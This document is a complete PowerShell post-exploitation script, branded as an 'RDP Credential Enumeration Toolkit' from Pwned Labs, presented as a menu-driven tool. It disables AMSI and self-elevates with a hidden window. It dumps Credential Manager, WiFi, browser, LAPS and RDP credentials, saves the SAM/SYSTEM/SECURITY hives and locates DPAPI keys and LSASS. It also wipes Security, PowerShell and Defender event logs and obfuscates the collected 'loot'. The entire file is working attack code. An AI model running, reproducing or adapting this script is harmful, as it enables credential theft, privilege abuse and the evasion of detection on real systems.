[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

function Invoke-PrivilegeEscalation {
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        try {
            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction SilentlyContinue
            Exit
        } catch {}
    } else {
        $host.UI.RawUI.WindowTitle = "Credential Enumeration - Administrator RDP Session"
    }
}

function xor-encode {
    param (
        [string]$Path,
        [byte]$Key = 0x42
    )
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    for($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $Key
    }
    [Convert]::ToBase64String($bytes) | Out-File "$Path.xor64" -Encoding ascii
    Remove-Item $Path -Force -ErrorAction SilentlyContinue
}

function Clear-CommonLogs {
    $logsToClear = @("Security", "System", "Application", "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-Windows Defender/Operational")
    foreach ($log in $logsToClear) {
        try {
            if ($log -like "Microsoft-*") {
                wevtutil cl $log 2>$null
            } else {
                Clear-EventLog -LogName $log -ErrorAction SilentlyContinue
            }
        } catch {}
    }
}

function Func-CredManager {
    try {
        [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
        $vault = New-Object Windows.Security.Credentials.PasswordVault
        $creds = $vault.RetrieveAll()
        $credList = @()
        $creds | ForEach-Object {
            try { $_.RetrievePassword() } catch {}
            $credList += [PSCustomObject]@{
                Resource = $_.Resource
                UserName = $_.UserName
                Password = $_.Password
            }
        }
        if ($credList.Count -gt 0) {
            $credList | ConvertTo-Json -Depth 4 | Out-File "$outputDir\credman.json" -Encoding utf8
            $credList | Export-Csv "$outputDir\credman.csv" -NoTypeInformation -Encoding utf8
        }
    } catch {}
}

function Func-CmdKey {
    $out = cmdkey /list
    $out | Out-File "$outputDir\cmdkey.txt" -Encoding ascii
    $parsed = @()
    $current = @{}
    foreach ($line in $out) {
        if ($line -match "^Target:\s*(.+)$") { $current.Target = $matches[1].Trim() }
        if ($line -match "^Type:\s*(.+)$")   { $current.Type   = $matches[1].Trim() }
        if ($line -match "^User:\s*(.+)$")   { $current.User   = $matches[1].Trim() }
        if ($line.Trim() -eq "") {
            if ($current.Count -gt 0) { $parsed += [PSCustomObject]$current; $current = @{} }
        }
    }
    if ($parsed.Count -gt 0) {
        $parsed | ConvertTo-Json -Depth 4 | Out-File "$outputDir\cmdkey.json" -Encoding utf8
    }
}

function Func-WiFi {
    $wifiList = @()
    (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
        $name = $_.Matches.Groups[1].Value.Trim()
        $key = (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$"
        if ($key) {
            $wifiList += [PSCustomObject]@{
                Profile  = $name
                Password = $key.Matches.Groups[1].Value.Trim()
            }
        }
    }
    if ($wifiList.Count -gt 0) {
        $wifiList | ConvertTo-Json -Depth 4 | Out-File "$outputDir\wifi.json" -Encoding utf8
        $wifiList | Export-Csv "$outputDir\wifi.csv" -NoTypeInformation -Encoding utf8
    }
}

function Func-RDP {
    $blobs = Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials","$env:LOCALAPPDATA\Microsoft\Credentials" -Recurse -File -ErrorAction SilentlyContinue |
        Select FullName, Length, LastWriteTime, @{Name="Computer";Expression={$env:COMPUTERNAME}}
    $blobs | ConvertTo-Json -Depth 4 | Out-File "$outputDir\rdp_cred_blobs.json" -Encoding utf8
    $blobs | Export-Csv "$outputDir\rdp_cred_blobs.csv" -NoTypeInformation
    reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" /s 2>$null | Out-File "$outputDir\rdp_default.reg.txt"
    reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s 2>$null | Out-File "$outputDir\rdp_servers.reg.txt"
}

function Func-Browsers {
    $paths = @(
        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
        @{Name="Edge";   Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
        @{Name="Firefox";Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue | Select -Last 1 -Expand FullName) + "\logins.json"}
    )
    foreach ($p in $paths) {
        if (Test-Path $p.Path) {
            $dest = "$outputDir\browser_$($p.Name.ToLower())"
            if ($p.Name -eq "Firefox") {
                Copy-Item $p.Path "$dest.json" -Force
            } else {
                Copy-Item $p.Path "$dest.sqlite" -Force
            }
        }
    }
}

function Func-LAPS {
    try {
        Get-ADComputer $env:COMPUTERNAME -Properties ms-Mcs-AdmPwd -ErrorAction Stop |
            Select-Object Name, ms-Mcs-AdmPwd |
            ConvertTo-Json -Depth 3 |
            Out-File "$outputDir\laps.json" -Encoding utf8
    } catch {}
}

function Func-IE {
    reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" /s 2>$null | Out-File "$outputDir\ie_intelliforms.reg.txt"
    reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers" /s 2>$null | Out-File "$outputDir\cred_providers.reg.txt"
}

function Func-Unattended {
    Get-ChildItem -Path "C:\","C:\Windows\Panther","C:\Windows\System32\sysprep" -Recurse -Include *.xml,*.txt,unattend*,sysprep* -ErrorAction SilentlyContinue |
        Where-Object { $_.Length -lt 1MB -and $_.Length -gt 0 } |
        ForEach-Object {
            Copy-Item $_.FullName "$outputDir\unattended_$($_.Name)" -Force
        }
}

function Func-Recent {
    $recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Recurse -ErrorAction SilentlyContinue |
        Select FullName, LastWriteTime, Length
    $recent | ConvertTo-Json -Depth 4 | Out-File "$outputDir\recent_files.json" -Encoding utf8
    $recent | Export-Csv "$outputDir\recent_files.csv" -NoTypeInformation
    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /s 2>$null | Out-File "$outputDir\runmru.txt"
    Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" "$outputDir\powershell_history.txt" -ErrorAction SilentlyContinue
}

function Func-Hives {
    reg save HKLM\SAM     "$outputDir\sam.hive"     2>$null
    reg save HKLM\SYSTEM  "$outputDir\system.hive"  2>$null
    reg save HKLM\SECURITY "$outputDir\security.hive" 2>$null
}

function Func-Dpapi {
    Get-ChildItem -Path "$env:APPDATA\Microsoft\Protect", "$env:LOCALAPPDATA\Microsoft\Protect" -Recurse -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match '^[0-9a-f]{40}$' } |
        Select FullName, Length, LastWriteTime |
        ConvertTo-Json -Depth 4 |
        Out-File "$outputDir\dpapi_masterkeys.json" -Encoding utf8
}

function Func-LsassDumpHint {
    Get-Process -Name lsass -ErrorAction SilentlyContinue |
        Select Id, StartTime, Path, @{Name="Session";Expression={$_.SessionId}} |
        ConvertTo-Json -Depth 3 |
        Out-File "$outputDir\lsass_process.json" -Encoding utf8
    Get-Service -Name seclogon -ErrorAction SilentlyContinue | Select Name, Status, StartType | ConvertTo-Json | Out-File "$outputDir\seclogon.json" -Encoding utf8
}

function Func-ScheduledTasksCreds {
    Get-ScheduledTask | Where-Object { $_.Principal.UserId -or $_.Principal.LogonType -eq "Password" } |
        Select TaskName, TaskPath, Principal, @{Name="User";Expression={$_.Principal.UserId}}, @{Name="LogonType";Expression={$_.Principal.LogonType}} |
        ConvertTo-Json -Depth 4 |
        Out-File "$outputDir\scheduled_tasks_creds.json" -Encoding utf8
}

function Func-RDPThiefArtifacts {
    Get-ChildItem -Path "C:\Windows\Temp","C:\Users\*\AppData\Local\Temp" -Recurse -Include *rdp*,*mstsc*,*termsrv* -ErrorAction SilentlyContinue |
        Select FullName, Length, LastWriteTime |
        ConvertTo-Json -Depth 4 |
        Out-File "$outputDir\rdp_temp_artifacts.json" -Encoding utf8
}

function Func-Winlogon {
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /s 2>$null |
        Out-File "$outputDir\winlogon.reg.txt"
}

function Show-Menu {
    Clear-Host
    Write-Host @"
╔═══════════════════════════════════════════════════════════════════════════╗
║ RDP Credential Enumeration Toolkit - 2026 ║
║ Pwned Labs | @maverickx64 ║
╚═══════════════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan
    Write-Host "Select an option:" -ForegroundColor Yellow
    Write-Host " 1. Windows Credential Manager"
    Write-Host " 2. cmdkey / network credentials"
    Write-Host " 3. WiFi Passwords"
    Write-Host " 4. RDP Credentials & servers"
    Write-Host " 5. Browser Passwords (files)"
    Write-Host " 6. LAPS Password"
    Write-Host " 7. IE / Legacy Edge / Cred Providers"
    Write-Host " 8. Unattended & Sysprep Files"
    Write-Host " 9. Recent Files & PowerShell History"
    Write-Host "10. SAM / SYSTEM / SECURITY Hives"
    Write-Host "11. Clear common event logs"
    Write-Host "12. DPAPI master key locations"
    Write-Host "13. LSASS process & seclogon status"
    Write-Host "14. Scheduled Tasks with stored creds"
    Write-Host "15. RDP-related temp artifacts"
    Write-Host "16. Winlogon registry keys"
    Write-Host " A. Run All Enumeration"
    Write-Host " B. Run All + Clear Logs"
    Write-Host " E. Encode all loot (XOR + Base64)"
    Write-Host " 0. Exit"
    $choice = Read-Host "Enter choice"
    return $choice
}

$outputDir = "$env:USERPROFILE\Desktop\Loot_$(Get-Date -Format 'yyyy-MM-dd_HHmm')"
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
Write-Host "[+] Loot directory: $outputDir`n" -ForegroundColor Green

Invoke-PrivilegeEscalation

do {
    $choice = Show-Menu
    switch ($choice.ToUpper()) {
        '1'  { Func-CredManager }
        '2'  { Func-CmdKey }
        '3'  { Func-WiFi }
        '4'  { Func-RDP }
        '5'  { Func-Browsers }
        '6'  { Func-LAPS }
        '7'  { Func-IE }
        '8'  { Func-Unattended }
        '9'  { Func-Recent }
        '10' { Func-Hives }
        '11' { Clear-CommonLogs }
        '12' { Func-Dpapi }
        '13' { Func-LsassDumpHint }
        '14' { Func-ScheduledTasksCreds }
        '15' { Func-RDPThiefArtifacts }
        '16' { Func-Winlogon }
        'A'  {
            Func-CredManager
            Func-CmdKey
            Func-WiFi
            Func-RDP
            Func-Browsers
            Func-LAPS
            Func-IE
            Func-Unattended
            Func-Recent
            Func-Hives
            Func-Dpapi
            Func-LsassDumpHint
            Func-ScheduledTasksCreds
            Func-RDPThiefArtifacts
            Func-Winlogon
        }
        'B'  {
            Func-CredManager
            Func-CmdKey
            Func-WiFi
            Func-RDP
            Func-Browsers
            Func-LAPS
            Func-IE
            Func-Unattended
            Func-Recent
            Func-Hives
            Func-Dpapi
            Func-LsassDumpHint
            Func-ScheduledTasksCreds
            Func-RDPThiefArtifacts
            Func-Winlogon
            Clear-CommonLogs
        }
        'E'  {
            Get-ChildItem $outputDir -File | ForEach-Object {
                xor-encode $_.FullName
            }
        }
        '0'  { break }
    }
    if ($choice -ne '0') {
        $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
} while ($choice -ne '0')

Write-Host @"
Finished.
Loot saved in: $outputDir
Use 'E' to XOR-encode + Base64 all files
Pwned Labs | @maverickx64
"@ -ForegroundColor Cyan
